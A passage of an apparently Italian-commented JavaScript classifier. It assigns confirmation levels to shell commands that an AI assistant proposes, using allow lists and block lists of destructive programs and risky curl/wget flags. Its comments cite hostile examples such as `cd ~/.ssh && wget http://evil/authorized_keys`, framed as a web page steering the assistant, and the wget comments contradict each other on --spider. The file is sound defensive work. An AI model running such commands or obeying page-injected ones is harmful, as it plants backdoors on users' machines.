// Classificatore di comandi shell → livello di sicurezza (#146.6).
//
// Filo può eseguire comandi da terminale, ma il LIVELLO non lo decide mai
// l'LLM: lo calcola QUI il main process sul comando EFFETTIVO che verrà
// eseguito (vedi src/main/services/handlers.js, caso ESEGUI_COMANDO). I tre
// livelli sono quelli del registro azioni (src/shared/actionLevels.js):
//
//   1 — sola lettura, in whitelist esplicita: esegue subito senza chiedere.
//   2 — modifica lo stato in modo recuperabile (popup di conferma).
//   3 — cancellazioni, comandi pericolosi e QUALSIASI comando non riconosciuto
//       (l'utente deve digitare "conferma").
//
// Principio della spec: "dato che è impossibile assegnare un livello ad ogni
// comando, i comandi non standard hanno livello 3 di default". Quindi la
// classificazione è una whitelist: si scende a 1 o 2 SOLO per programmi (e
// sotto-comandi) esplicitamente riconosciuti come sicuri; tutto il resto è 3.
//
// Sicurezza by-design:
//   • una SEQUENZA pura di comandi separati da `&&`, `||` o `;` — e composta
//     solo da comandi a loro volta riconoscibili — prende il livello MASSIMO dei
//     suoi pezzi. Così `cd Desktop && ls` (due letture) resta livello 1 invece
//     di salire a 3 solo perché concatenato; `ls && rm -rf x` resta 3 (per via
//     dell'rm). È sicuro perché il livello non scende mai sotto quello del pezzo
//     più pericoloso.
//   • una PIPELINE pura (solo `|`) scende a livello 1 SOLO se OGNI segmento è
//     una lettura riconosciuta, scriptblock inclusi (vedi segmentIsRead): la
//     shell di default su Windows è PowerShell, e lì leggere significa scrivere
//     pipeline. Un solo segmento non riconosciuto, o uno scriptblock che
//     potrebbe invocare qualcosa, e la pipeline resta 3.
//   • background (&), redirezioni (>, >>, <), sostituzioni ($(...), ${...},
//     backtick) e newline NON sono semplici sequenze: il comando non è
//     "interamente riconoscibile" → 3, sempre. Non proviamo a fare il parsing
//     del quoting: un falso positivo qui costa solo più attrito (digitare
//     "conferma"), mai un'esecuzione silenziosa indebita.
//   • le VIRGOLETTE vengono tolte prima di classificare (vedi `unquote`): tutte
//     le shell supportate eseguono `git checkout "."`, `git checkout .""` e
//     `git checkout .` allo stesso identico modo, quindi devono ricevere lo
//     stesso livello. Non è parsing del quoting — è una normalizzazione che può
//     solo far riconoscere PIÙ bersagli/flag pericolosi, mai di meno.
//   • un backstop di programmi distruttivi (rm/del/format/…) resta 3 anche se
//     per errore comparisse in una whitelist.
//   • la whitelist FIDA di un nome solo se invocato NUDO (nessun separatore di
//     percorso, nessuna estensione eseguibile, nessun prefisso `.\`/`.`/`&`).
//     Un file su disco chiamato come un comando fidato — `.\Get-ChildItem.exe`,
//     `C:\tmp\ls.exe`, `Get-ChildItem.exe` dal PATH — NON è quel comando: è un
//     eseguibile arbitrario e resta al livello 3 di default. Il backstop dei
//     distruttivi invece guarda il basename (così `/bin/rm` resta 3 col
//     percorso): catturare un nome pericoloso travestito è sempre giusto,
//     fidarsi di uno fidato travestito no.
//   • flag pericolosi (--force, --hard, -rf…) alzano un livello ≤2 a 3.
//   • SCARICARE DALLA RETE FACENDO ATTERRARE UN FILE SU DISCO è sempre livello 3
//     (digita "conferma"). L'invariante è sull'EFFETTO, non sul nome del flag:
//     wget scrive un file anche senza alcun flag di output, e la CARTELLA in cui
//     lo scrive la sceglie l'assistente da sé con un `cd` (livello 1, nessuna
//     conferma, persistente).
//     Quindi WGET È SEMPRE 3, senza eccezioni: l'unica sua forma che davvero non
//     fa atterrare niente (`--spider`) NON viene più esentata. Un'esenzione la si
//     decide per forza leggendo il TESTO del comando, ma chi il comando lo compone
//     può far comparire quella parola dove wget non la applica — dopo un `--`
//     (`wget -N -- http://x --spider`: da lì in poi sono indirizzi), dentro le
//     virgolette (`wget "http://x" " --spider "`), dentro l'URL stesso
//     (`wget "http://x#  --spider "`) — e riavere lo scaricamento con un solo
//     clic. Riconoscere "davvero un'opzione" richiederebbe di riprodurre il
//     parsing di getopt e del quoting: fuori dal principio del file. Toglierla
//     costa una conferma in più su un comando raro (per la sola verifica di un
//     indirizzo c'è `curl -I`, che stampa a schermo e resta 2) e chiude la porta.
//     curl invece, SENZA flag che scrivono, stampa a schermo e non fa atterrare
//     niente: resta 2. Due programmi che si comportano diversamente prendono
//     regole diverse — è l'effetto a decidere. Salgono a 3 i flag curl che fanno
//     atterrare qualcosa: output-su-file (-o/-O/--output/--remote-name…), i DATI
//     ACCESSORI il cui contenuto è influenzato dal server (-D/--dump-header,
//     -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr, --libcurl,
//     --hsts, --alt-svc, `-w '%output{...}'`) e -K/--config, che nasconde
//     l'output dentro un file di opzioni.

(function (global) {
  'use strict';

  // Metacaratteri che rendono il comando composto/non riconoscibile → 3.
  // (`-` di `&&`/`||` è coperto da `&`/`|`.)
  const CHAIN_RE = /[|;&`<>]|\$\(|\$\{|\r|\n/;

  // Programmi che eseguono codice arbitrario o distruggono stato: SEMPRE 3,
  // controllati per primi (backstop anche se finissero in una whitelist).
  const ALWAYS_3 = new Set([
    // cancellazioni
    'rm', 'rmdir', 'rd', 'del', 'erase', 'unlink', 'deltree', 'shred',
    // catastrofici / sistema
    'format', 'mkfs', 'fdisk', 'diskpart', 'dd', 'shutdown', 'reboot',
    'restart', 'halt', 'poweroff', 'kill', 'killall', 'taskkill', 'pkill',
    'reg', 'regedit', 'sc', 'net', 'netsh', 'fsutil', 'bcdedit', 'mklink',
    'chmod', 'chown', 'chgrp', 'attrib', 'icacls', 'takeown',
    // shell ed esecutori diretti: SEMPRE 3 (anche `bash` da solo apre una
    // sessione interattiva; nessuna eccezione "versione").
    'sh', 'bash', 'zsh', 'fish', 'powershell', 'pwsh', 'cmd', 'eval', 'exec',
    'ssh', 'scp', 'sudo', 'su', 'doas',
  ]);

  // Interpreti / build tool / runner: eseguono codice arbitrario → livello 3,
  // ECCEZIONE: una pura interrogazione di versione/help (`node --version`,
  // `python -V`, `go version`, `docker --help`…) è sola lettura → livello 1.
  const ARBITRARY_CODE = new Set([
    'node', 'deno', 'bun', 'ts-node', 'tsx', 'python', 'python3', 'py', 'ruby',
    'perl', 'php', 'osascript', 'npx', 'pnpm', 'yarn', 'make', 'cmake', 'cargo',
    'go', 'rustc', 'gcc', 'g++', 'clang', 'docker', 'docker-compose', 'podman',
    'kubectl', 'helm', 'terraform', 'ansible', 'java', 'javac', 'dotnet', 'mvn',
    'gradle', 'tsc', 'dart', 'flutter', 'scala', 'kotlin', 'julia', 'lua',
    'code', 'rustup', 'rbenv', 'pyenv', 'nvm', 'composer', 'bundle', 'gem',
  ]);

  // Token che da soli rendono un comando una pura interrogazione (lettura):
  // versione o aiuto. `-v`/`-V` qui valgono "version" (vero per i tool sopra);
  // l'ambiguità `-v`=verbose non danneggia, perché un `cmd -v` senza operandi
  // non compie alcuna azione.
  const VERSION_TOKENS = new Set([
    '--version', '-version', '-v', '-V', 'version', '--help', '-help', '-h',
    'help', '/?', '/version', '--usage', '-?',
  ]);

  // Il comando è SOLO programma + token di versione/help (almeno uno: un
  // programma "nudo" come `node` apre invece un REPL e non è lettura sicura).
  function isVersionQuery(cmd) {
    const rest = tokens(cmd).slice(1);
    if (!rest.length) return false;
    return rest.every((t) => VERSION_TOKENS.has(t.toLowerCase()));
  }

  // Sola lettura, nessun effetto sullo stato: livello 1.
  const LEVEL1 = new Set([
    // `cd`/`chdir`: cambia solo la cartella di lavoro (effetto benigno e
    // pienamente reversibile, nessuna modifica su disco). È la primitiva di
    // navigazione dell'assistente: la cwd è persistente tra i suoi comandi, e
    // pretendere di digitare "conferma" a ogni spostamento la renderebbe
    // inutilizzabile. I `cd` con metacaratteri ($(...), ;, &&…) restano 3 via
    // CHAIN_RE.
    'cd', 'chdir',
    'ls', 'dir', 'pwd', 'cat', 'type', 'echo', 'whoami', 'hostname', 'date',
    'where', 'which', 'head', 'tail', 'tree', 'wc', 'ver', 'uname', 'more',
    'clear', 'cls', 'grep', 'findstr', 'stat', 'basename', 'dirname',
    'realpath', 'readlink', 'du', 'df', 'uptime', 'id', 'groups', 'whatis',
    'cal', 'nproc', 'arch',
    // diagnostica comune di sola lettura
    'ps', 'free', 'lscpu', 'lsblk', 'lsusb', 'printenv', 'whereis', 'who',
    'w', 'vmstat', 'lsof', 'column', 'cut', 'uniq', 'nl', 'file',
    'md5sum', 'sha1sum', 'sha256sum', 'cksum',
  ]);

  // Alcuni programmi LEVEL1 sono di sola lettura SOLO finché non ricevono gli
  // argomenti che ne cambiano il senso: `date` legge l'orologio ma `date -s`/
  // `--set` lo IMPOSTA, `hostname` stampa il nome ma `hostname <nome>` lo
  // CAMBIA. Senza tali argomenti restano livello 1; con essi salgono a livello 2
  // (conferma), perché modificano lo stato del sistema in modo recuperabile.
  // Ogni predicato riceve il comando intero e ritorna true se MODIFICA lo stato.
  const LEVEL1_MUTATES = {
    // `date -s "..."` / `date --set=...` imposta l'orologio; le altre forme
    // (`date`, `date +%F`, `date -u`, `date -d "ieri"`) sono letture.
    date: (cmd) => /(^|\s)(-s|--set)(=|\s|$)/i.test(cmd),
    // `hostname <nome>` (un operando non-flag) o `hostname -F file` imposta il
    // nome host; i flag di lettura (-f, -I, -i, -d, -s, -A, -a…) non cambiano
    // nulla. Nota: qui `-s` = "short" (lettura), NON "set".
    hostname: (cmd) => {
      const rest = tokens(cmd).slice(1);
      // `-F`/`--file` (imposta il nome da file) è case-sensitive: `-f` = fqdn
      // è lettura, NON deve combaciare.
      return rest.some((t) => /^(-F|--file)$/.test(t) || !t.startsWith('-'));
    },
  };

  // Modifica lo stato ma in modo recuperabile: livello 2.
  const LEVEL2 = new Set([
    'mkdir', 'md', 'touch', 'cp', 'copy', 'xcopy', 'robocopy', 'move', 'mv',
    'ren', 'rename', 'tar', 'zip', 'unzip', 'gzip', 'gunzip', 'curl', 'wget',
    'ln',
  ]);

  // ── PowerShell: cmdlet di sola lettura e pipeline di sole letture ─────────
  //
  // Su Windows la shell di Filo È PowerShell (src/main/services/terminal.js), e
  // un LLM che scrive PowerShell naturale usa `Get-ChildItem` e le pipeline, non
  // `ls`. Prima di questo blocco OGNI cmdlet e OGNI pipeline cadevano nel ramo
  // "non riconosciuto" → livello 3: elencare una cartella costava all'utente la
  // stessa frizione di un `rm -rf` (misurato su un banco con modelli reali: 26
  // comandi bloccati su 33, quasi tutti letture innocue).
  //
  // Il rimedio resta il principio del file — WHITELIST, l'ignoto è 3 — applicato
  // ai cmdlet. Criterio di ammissione: entra solo il cmdlet che NON ha una forma
  // capace di scrivere. In PowerShell è la norma, perché il gemello che scrive è
  // sempre un ALTRO verbo (Get-Item legge, Set-Item scrive; Get-Content legge,
  // Set-Content/Out-File/Tee-Object scrivono; Get-Process legge, Stop-Process
  // uccide; Get-Date legge l'orologio, Set-Date lo imposta): il cmdlet in lista
  // non ha quindi flag distruttivi da intercettare come in LEVEL1_MUTATES —
  // basta che il gemello che scrive resti FUORI, dove il default lo tiene a 3.
  // Restano fuori di proposito anche i cmdlet di sola lettura ma con una
  // superficie troppo larga o ambigua (Get-CimInstance/Get-WmiObject, che
  // arrivano ovunque nel sistema; Get-Credential, che apre una richiesta di
  // password; Measure-Command, che ESEGUE lo scriptblock che riceve).
  const PS_READ = new Set([
    'get-childitem', 'gci', 'get-content', 'gc', 'get-item', 'gi',
    'get-itemproperty', 'gp', 'get-itempropertyvalue', 'get-location', 'gl',
    'get-date', 'get-process', 'gps', 'get-service', 'get-help', 'get-member',
    'get-alias', 'get-variable', 'get-module', 'get-psdrive', 'get-host',
    'get-command', 'get-history', 'get-computerinfo', 'get-culture',
    'get-timezone', 'get-random', 'get-unique',
    'select-string', 'sls', 'select-object', 'select', 'sort-object',
    'measure-object', 'measure', 'group-object', 'group', 'compare-object',
    'test-path', 'resolve-path', 'split-path', 'join-path', 'convert-path',
    'format-table', 'ft', 'format-list', 'fl', 'format-wide', 'fw',
    'out-string', 'out-host', 'out-null', 'write-output', 'write-host',
    'convertto-json', 'convertfrom-json', 'convertto-csv', 'convertfrom-csv',
    'convertfrom-stringdata', 'get-filehash',
    // Navigazione pura: cambiano solo la cartella di lavoro, come `cd` (che è
    // già livello 1). `Set-Location`/`sl`, `pushd`/`popd` sono le forme
    // PowerShell dello stesso gesto benigno e reversibile.
    'set-location', 'sl', 'pushd', 'popd',
  ]);
  // Alias VOLUTAMENTE esclusi perché su un'altra shell sono un programma che
  // SCRIVE, e il classificatore non sa quale shell eseguirà il comando: `sort`
  // (Sort-Object in PowerShell, ma `sort -o file` su Unix scrive un file), `gm`
  // (Get-Member, ma anche GraphicsMagick, che converte e sovrascrive immagini),
  // `gcm` (Get-Command, ma anche git-credential-manager, che cancella
  // credenziali), `compare` (Compare-Object, ma anche ImageMagick, che scrive
  // l'immagine di confronto). I nomi lunghi corrispondenti restano ammessi.

  // Where-Object/ForEach-Object (e gli alias `?`, `%`, `where`, `foreach`) hanno
  // senso solo DENTRO una pipeline: da soli non ricevono niente da filtrare.
  const PS_PIPE_ONLY = new Set(['where-object', 'where', '?', 'foreach-object', 'foreach', '%']);
  // ForEach-Object senza scriptblock usa la forma "nome di membro", che INVOCA
  // il metodo su ogni oggetto: `Get-ChildItem | % Delete` CANCELLA i file. Quindi
  // per questi lo scriptblock (validato) è obbligatorio.
  const PS_FOREACH = new Set(['foreach-object', 'foreach', '%']);

  // Uno SCRIPTBLOCK `{ … }` è il buco naturale della pipeline: `gci | % {
  // Remove-Item $_ }` è una cancellazione travestita da lettura. Non proviamo a
  // classificare cosa c'è dentro (sarebbe interpretare PowerShell): pretendiamo
  // che il blocco sia INERTE, cioè che non contenga NESSUN token in posizione di
  // comando. Passano proprietà, confronti, operatori e numeri (`{ $_.Length -gt
  // 1000 }`); non passa niente che possa invocare qualcosa — parole nude
  // (`Remove-Item`, `ri`, `foobar`), percorsi di eseguibili (`.\x.exe`),
  // dot-sourcing, chiamate di metodo `(`, assegnazioni `=`, membri statici `::`.
  // I LETTERALI FRA VIRGOLETTE sono già stati neutralizzati a `0` da chi chiama
  // (segmentIsRead): un confronto `-eq "readme.md"` è inerte, la stringa non è
  // un comando. È volutamente più severo del necessario: un blocco di lettura
  // respinto costa una conferma in più, uno ostile accettato costa i file.
  function scriptBlockIsInert(inner) {
    const s = String(inner);
    if (/[=(){}`;&|<>@]|::/.test(s)) return false;
    for (const t of s.trim().split(/\s+/).filter(Boolean)) {
      if (/^[A-Za-z_]/.test(t)) return false;              // parola nuda = comando
      if (/^\.{1,2}$/.test(t)) return false;               // dot-sourcing
      if (/[\\/]/.test(t) && !/^-/.test(t)) return false;  // percorso di un eseguibile
    }
    return true;
  }

  // Un SEGMENTO (comando singolo, o un pezzo di pipeline) è di sola lettura?
  // Serve sia per il cmdlet isolato sia per ogni pezzo di una pipeline, così i
  // due cammini non possono divergere. Riceve il segmento GREZZO (con le
  // virgolette): i letterali quotati vanno riconosciuti come inerti PRIMA di
  // togliere le virgolette, altrimenti una parola quotata resta nuda e sembra un
  // comando.
  function segmentIsRead(seg, inPipeline) {
    // `%{...}` e `?{...}` (senza spazio) sono scrittura PowerShell normalissima:
    // isoliamo le graffe come token a sé prima di guardare programma e blocco.
    const norm = String(seg).replace(/\{/g, ' { ').replace(/\}/g, ' } ');
    // Il primo token deve essere il comando NUDO, non un file omonimo su disco
    // (`.\Get-ChildItem.exe`): senza questo, `programOf` (che fa basename e
    // toglie l'estensione) lo scambierebbe per il cmdlet fidato.
    if (!isBareName(tokens(norm)[0])) return false;
    // I letterali fra virgolette sono inerti: li rimpiazziamo con `0` (un numero,
    // che scriptBlockIsInert accetta). Così un confronto `-eq "readme.md"` passa,
    // e un metacarattere DENTRO le virgolette non fa salire il livello. Ciò che
    // invoca davvero (parole nude, `&`, `(`, `.`) sta FUORI dalle virgolette e
    // viene comunque intercettato.
    const noStr = norm.replace(/'[^']*'/g, ' 0 ').replace(/"[^"]*"/g, ' 0 ');
    // Sottoespressioni, chiamate, hashtable/array, redirezioni, operatore di
    // chiamata, membri statici: dentro può nascondersi qualunque cosa.
    if (/[`()<>;&|@]|\$\(|\$\{|::/.test(noStr)) return false;
    const open = (noStr.match(/\{/g) || []).length;
    const close = (noStr.match(/\}/g) || []).length;
    if (open !== close || open > 1) return false; // graffe sbilanciate o annidate
    if (open === 1) {
      const i = noStr.indexOf('{');
      const j = noStr.lastIndexOf('}');
      if (j < i || !scriptBlockIsInert(noStr.slice(i + 1, j))) return false;
    }
    const prog = programOf(norm);
    if (!prog) return false;
    if (ALWAYS_3.has(prog) || ARBITRARY_CODE.has(prog)) return false;
    if (PS_PIPE_ONLY.has(prog)) {
      if (!inPipeline) return false;
      return PS_FOREACH.has(prog) ? open === 1 : true;
    }
    if (PS_READ.has(prog)) return true;
    // Dentro una pipeline vale come lettura anche tutto ciò che il
    // classificatore riconosce già come livello 1 (`ls`, `cat`, `grep`, `head`,
    // `git log`…): `cat file | grep errore` non compie nulla di più di `cat file`.
    return inPipeline && classifyOne(seg) === 1;
  }

  // Il comando è una pura PIPELINE (solo `|`), senza sequenziamento, background,
  // redirezioni o sostituzioni? Ritorna i segmenti, altrimenti null. Nota: `||`
  // produce un segmento vuoto e fa fallire il controllo, quindi non passa di qui.
  function splitSafePipeline(cmd) {
    if (/[`<>;&]|\$\(|\$\{|\r|\n/.test(cmd)) return null;
    if (cmd.indexOf('|') === -1) return null;
    const parts = cmd.split('|').map((p) => p.trim());
    if (parts.length < 2 || parts.some((p) => !p)) return null;
    return parts;
  }

  // Flag che alzano a 3 un comando altrimenti ≤2.
  const DANGEROUS_FLAG_RE = /(^|\s)(--force|--hard|--delete|--prune|--no-preserve-root|-[a-z]*f[a-z]*r[a-z]*|-[a-z]*r[a-z]*f[a-z]*)(\s|$)/i;

  // robocopy: i flag distruttivi Windows usano lo slash, non il trattino, quindi
  // DANGEROUS_FLAG_RE (stile Unix) NON li vede. `robocopy SRC DST /MIR` e
  // `/PURGE` CANCELLANO in modo permanente (bypassando il Cestino) i file nella
  // destinazione che non esistono nella sorgente — un `rm -rf` mirato mascherato
  // da "copia" → devono chiedere di digitare "conferma" (3), non un semplice OK
  // (2). `/MOVE` e `/MOV` spostano cancellando i file dalla SORGENTE dopo la
  // copia: se la sorgente è quella sbagliata (o pilotata da una pagina ostile) si
  // svuota una cartella non voluta → stessa classe distruttiva. Check
  // robocopy-specifico e case-insensitive (i flag Windows lo sono): applicarlo a
  // ogni comando globalmente rischierebbe falsi positivi con path Unix tipo
  // `cp /mir file` (una cartella chiamata "mir"); solo robocopy usa questi flag.
  const ROBOCOPY_DESTRUCTIVE_RE = /(^|\s)\/(MIR|PURGE|MOVE|MOV)(\s|$)/i;

  // curl con un flag di OUTPUT-SU-FILE scrive i byte scaricati in un
  // percorso scelto da chi lancia il comando (l'LLM, potenzialmente pilotato da
  // una pagina ostile): può SOVRASCRIVERE qualsiasi file — chiavi SSH
  // (~/.ssh/authorized_keys), script d'avvio della shell (~/.bashrc, ~/.profile)
  // — trasformando un "download" in una backdoor. È qualitativamente più grave
  // del semplice download (che scrive su stdout o al più nella cwd): alza a 3
  // (digita "conferma"), come i flag distruttivi di git. Coperti (anche in
  // bundle di short-flag tipo `-sLo`): -o/--output(-dir/-document),
  // -O/--remote-name(-all), -J/--remote-header-name (nome del file scelto dal
  // server). Non tentiamo di distinguere il percorso "sensibile" da quello
  // innocuo: è inaffidabile (path relativi, ~, symlink, differenze OS) e un
  // falso negativo qui = il buco di sicurezza; l'over-cautela costa solo attrito.
  // Check curl-specifico (come GIT_DANGER_RE): un `-o` globale su `tar`/`zip`
  // significherebbe altro. In un bundle di short-flag l'unico modo di avere una
  // `o`/`O` è che sia il flag di output (curl -o/-O): gli altri short-flag di
  // curl non contengono `o`, quindi `-[a-z]*o` non ha falsi positivi qui.
  // `-J`/--remote-header-name senza -O è inerte, e con -O è già coperto da -O:
  // non serve intercettare la `j` (che confliggerebbe con curl -j =
  // --junk-session-cookies, innocuo). wget non passa di qui: è 3 comunque.
  const CURL_OUTPUT_RE = /(^|\s)(--output|--remote-name|--remote-header-name|-[a-z]*o)/i;

  // curl con `-D`/`--dump-header <file>` scrive gli header della risposta in un
  // percorso arbitrario: il contenuto lo decide il server (quindi l'attaccante
  // che pilota l'assistente da una pagina ostile), rendendolo un altro primitivo
  // di scrittura-su-file arbitraria → 3. Meno potente di `-o`/`-O` (byte header,
  // non corpo scelto liberamente) ma stessa classe: over-cautela = solo attrito.
  // Check curl-specifico e case-SENSITIVE sulla `D`: `-d`/`--data` (corpo POST)
  // è innocuo e NON deve salire; solo la `D` maiuscola (in curl = solo
  // `--dump-header`) alza, anche in bundle (`-sD file`).
  const CURL_DUMP_RE = /(^|\s)(--dump-header|-[a-zA-Z]*D)/;

  // curl con flag che SALVANO DATI ACCESSORI in un percorso scelto da chi lancia
  // il comando, con un contenuto comunque INFLUENZATO dal server (quindi da una
  // pagina ostile che pilota l'assistente): -c/--cookie-jar (i cookie del sito),
  // --etag-save (l'ETag della risposta), --trace/--trace-ascii (la traccia di
  // debug della richiesta/risposta), --stderr (log/diagnostica di curl),
  // --libcurl (il programma C equivalente, che contiene URL e header), --hsts e
  // --alt-svc (le cache HSTS/Alt-Svc: curl le RILEGGE e le RISCRIVE con quanto
  // dichiara il server, quindi creano/aggiornano il file indicato). Sono la
  // stessa classe logica di -D/--dump-header — scrittura-su-file arbitraria di
  // roba decisa dal remoto — solo più di nicchia e col contenuto più vincolato
  // (formato cookie netscape, ETag quotato, dump esadecimale): l'iniezione è meno
  // pulita ma il primitivo di scrittura resta, quindi salgono a 3 (digita
  // "conferma") per simmetria col resto dei download. Check curl-specifico e
  // case-SENSITIVE sulla `c`: `-c` (minuscolo, in curl SOLO --cookie-jar, scrive)
  // alza anche in bundle (`-sc`, `-cs`); `-C`/--continue-at (MAIUSCOLO, riprende
  // un download normale) NON deve salire. I long-flag di sola lettura simili
  // (--cookie/-b legge i cookie, --etag-compare li confronta, --cacert/--cert
  // leggono un certificato, --trace-time/--trace-ids sono modificatori senza
  // file) NON combaciano: la parte long è ancorata con `(=|\s|$)` e il ramo short
  // matcha solo la `c` minuscola in un bundle a trattino singolo.
  const CURL_ACCESSORY_WRITE_RE = /(^|\s)(--cookie-jar|--etag-save|--trace(-ascii)?|--stderr)(=|\s|$)|(^|\s)-[a-zA-Z]*c/;

  // wget con `--save-cookies <file>` scrive i cookie del sito (contenuto
  // influenzato dal server) in un percorso arbitrario: stessa classe di
  // curl --cookie-jar → 3. `--load-cookies` (LEGGE i cookie) è innocuo e, essendo
  // esplicito il nome, NON combacia.
  const WGET_SAVE_COOKIES_RE = /(^|\s)--save-cookies(=|\s|$)/;

  // curl con `-K`/`--config <file>` LEGGE le opzioni da un file: dentro può
  // esserci `output = /home/utente/.ssh/authorized_keys`, cioè lo stesso
  // primitivo di scrittura di `-o` ma INVISIBILE nel testo del comando. L'effetto
  // non è ispezionabile → vale il principio del file (ciò che non si riconosce è
  // 3). Case-SENSITIVE sulla `K`: `-k`/`--insecure` (minuscolo, salta la verifica
  // del certificato ma non scrive niente) NON deve salire; in curl la `K`
  // maiuscola è solo `--config`, quindi anche in un bundle (`-sK cfg`) l'unica
  // lettura possibile è quella.
  const CURL_CONFIG_RE = /(^|\s)(--config(=|\s|$)|-[a-zA-Z]*K)/;

  // wget SCARICA SEMPRE SU FILE: è questa la differenza con curl (che senza `-o`
  // stampa a schermo) e il buco lasciato da un controllo basato sul NOME del
  // flag. Senza alcun flag di output, `wget <url>` crea comunque un file nella
  // cartella di lavoro, col nome deciso dall'URL (quindi dal server). E la
  // cartella di lavoro la sceglie l'assistente da sé: `cd` è livello 1 (nessuna
  // conferma) e la cwd è persistente tra i suoi comandi, quindi
  // `cd ~/.ssh && wget http://evil/authorized_keys` fa atterrare il file
  // ESATTAMENTE dove lo faceva atterrare `wget -O ~/.ssh/authorized_keys`, che
  // invece chiede di digitare "conferma". Stesso effetto → stesso livello: wget
  // sale a 3 sempre. Da qui vengono coperti senza un check dedicato anche `-c`
  // (riprendi: ACCODA a un file esistente) e `-N` (riscarica se più recente:
  // SOVRASCRIVE), che restavano al livello permissivo pur toccando file già lì.
  //
  // Unica forma di wget che non fa atterrare niente: `--spider`, che controlla
  // solo se l'URL esiste → resta 2. I flag che scrivono comunque un file
  // (-o logfile, -O, -P, --save-cookies…) sono già saliti a 3 PRIMA di questo
  // controllo, quindi `--spider` non può fare da scorciatoia per riabbassarli.
  const WGET_NO_DOWNLOAD_RE = /(^|\s)--spider(\s|$)/;

  // git: il livello dipende dal sotto-comando. I sotto-comandi "duali"
  // (tag, branch, config, remote) NON stanno qui: leggono da soli ma scrivono
  // con un operando, quindi li classifica GIT_DUAL guardando gli argomenti.
  const GIT_READ = new Set([
    'status', 'log', 'diff', 'show',
    'rev-parse', 'describe', 'blame', 'ls-files', 'ls-tree', 'shortlog',
    'reflog', 'whatchanged', 'cat-file', 'name-rev', 'symbolic-ref',
    'version', 'help', 'grep', 'count-objects',
  ]);
  const GIT_WRITE = new Set([
    'add', 'commit', 'push', 'pull', 'fetch', 'switch', 'merge',
    'rebase', 'cherry-pick', 'revert', 'init', 'clone', 'mv',
    'apply', 'am', 'pop', 'worktree', 'submodule',
  ]);
  // NB: 'checkout' e 'stash' NON stanno in GIT_WRITE: hanno forme DISTRUTTIVE che
  // scartano lavoro non salvato (`git checkout .`/`-- <path>`, `git stash drop`/
  // `clear`) e forme innocue (cambio ramo, salvataggio di uno stash). Il livello
  // dipende dagli argomenti → li classifica GIT_DUAL qui sotto.
  // I distruttivi di git (reset --hard, clean, branch -D, push --force…)
  // li intercetta DANGEROUS_FLAG_RE o il fatto che siano fuori dalle due liste.
  const GIT_DESTROY = new Set(['reset', 'clean', 'rm', 'gc', 'filter-branch', 'update-ref', 'prune']);

  // npm/pip: il livello dipende dal sotto-comando.
  // NB: 'config' NON sta qui: `npm/pip config` è duale (get/list leggono, set/
  // delete/edit CAMBIANO tra l'altro il registry dei pacchetti) → lo classifica
  // classifyNpm guardando il verbo.
  const NPM_READ = new Set(['list', 'ls', 'view', 'show', 'outdated', 'root', 'bin', 'prefix', 'ping', 'doctor', 'whoami', 'help', 'search']);
  const NPM_WRITE = new Set(['install', 'i', 'ci', 'add', 'update', 'upgrade', 'uninstall', 'remove', 'rm', 'dedupe', 'prune', 'link', 'rebuild']);
  // npm run / exec / start / test / publish → eseguono script arbitrari o
  // pubblicano (irreversibile) → restano fuori → 3.

  function tokens(cmd) {
    // Spezza grezzamente su spazi; sufficiente per leggere programma e flag,
    // dato che i comandi con quoting "interessante" finiscono comunque a 3.
    return String(cmd).trim().split(/\s+/).filter(Boolean);
  }

  // Le VIRGOLETTE non cambiano il comando che la shell esegue davvero, ma
  // possono nascondere ai controlli sia il programma sia il bersaglio: bash,
  // cmd e powershell collassano tutti `git checkout "."`, `git checkout .""`,
  // `git checkout ""."` e `git stash d''rop` esattamente in `git checkout .` /
  // `git stash drop`. Un controllo che guarda il testo grezzo vedrebbe un
  // token sconosciuto e lascerebbe passare con la sola conferma leggera un
  // comando che butta via lavoro non salvato (scenario "comando suggerito da
  // una pagina ostile"). Quindi PRIMA di classificare togliamo TUTTE le
  // virgolette dai token — non solo quelle che avvolgono il token intero, ma
  // anche quelle vuote incollate prima/dopo/in mezzo.
  //
  // Non è un parser di shell (resta vero il principio del file: niente parsing
  // del quoting) ed è sicuro per costruzione: togliere le virgolette può solo
  // far RICONOSCERE più bersagli/flag pericolosi, cioè far salire il livello,
  // mai scendere sotto quello che si vedrebbe altrimenti. Gli spazi dentro le
  // virgolette non ci sfuggono: `tokens()` spezza comunque su spazi, e un
  // comando così finisce nei rami cauti (più operandi = livello 3).
  function unquote(tok) {
    return String(tok).replace(/['"]/g, '');
  }

  // Comando con le virgolette rimosse token per token: la forma su cui girano
  // tutti i controlli (whitelist di programmi, flag pericolosi, bersagli).
  function dequote(cmd) {
    return tokens(cmd).map(unquote).join(' ');
  }

  function programOf(cmd) {
    const first = tokens(cmd)[0] || '';
    // togli quoting, prendi il basename, normalizza, togli estensioni eseguibili
    const bare = unquote(first);
    return bare.split(/[\\/]/).pop().toLowerCase().replace(/\.(exe|cmd|bat|ps1|com|msi)$/i, '');
  }

  // Estensioni di file ESEGUIBILI: se il primo token ne ha una, quel token è un
  // FILE su disco, non il comando di sistema che ne condivide il nome.
  const EXE_EXT_RE = /\.(exe|cmd|bat|ps1|psm1|com|msi|vbs|vbe|wsf|wsh|scr|pif|cpl|msc|jar|js|jse|ps1xml)$/i;

  // `programOf` fa il BASENAME del percorso e toglie l'estensione: serve al
  // backstop dei distruttivi (`/bin/rm` deve restare 3 anche col percorso). Ma
  // per FIDARSI di un comando (livello 1 o 2) quella normalizzazione è un buco:
  // un eseguibile piantato in una cartella e chiamato come un cmdlet di lettura
  // (`.\Get-ChildItem.exe`, `C:\tmp\ls.exe`, o `Get-ChildItem.exe` dal PATH)
  // verrebbe scambiato per il cmdlet ed eseguito SENZA conferma. Un comando è
  // "nudo" — cioè davvero quel comando di sistema, non un file omonimo — solo se
  // il primo token non ha separatori di percorso, né un'estensione eseguibile,
  // né un prefisso di chiamata (`.\`, `./`, `.`, `&`). Altrimenti è un programma
  // arbitrario e la whitelist non lo copre → resta al livello 3 di default.
  function isBareName(tok) {
    const t = unquote(String(tok || ''));
    if (!t) return false;
    if (/[\\/]/.test(t)) return false;   // qualunque separatore di percorso
    if (/^[.&]/.test(t)) return false;   // .\  ./  .  &  (chiamata / dot-source)
    if (EXE_EXT_RE.test(t)) return false; // estensione eseguibile = file, non cmdlet
    return true;
  }

  // sotto-comando = primo token che non è una flag (dopo il programma)
  function subcommandOf(cmd) {
    const t = tokens(cmd).slice(1).map(unquote);
    for (const x of t) {
      if (x && !x.startsWith('-')) return x.toLowerCase();
    }
    return '';
  }

  // In git i flag distruttivi sono più ricchi: oltre a --force/--hard, anche
